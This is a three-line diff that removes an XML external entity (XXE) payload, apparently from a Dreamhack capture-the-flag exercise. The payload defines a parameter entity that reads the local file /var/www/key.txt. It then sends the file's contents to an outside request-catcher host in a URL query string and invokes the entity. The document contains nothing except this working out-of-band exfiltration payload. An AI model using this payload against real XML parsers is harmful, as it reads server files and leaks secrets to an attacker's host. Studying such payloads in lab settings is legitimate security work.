@@ -1,3 +1,0 @@
-<!ENTITY % data SYSTEM "file:///var/www/key.txt">
-<!ENTITY % result SYSTEM "https://aahfzvo.request.dreamhack.games/receive?data=%data;">
-%result;
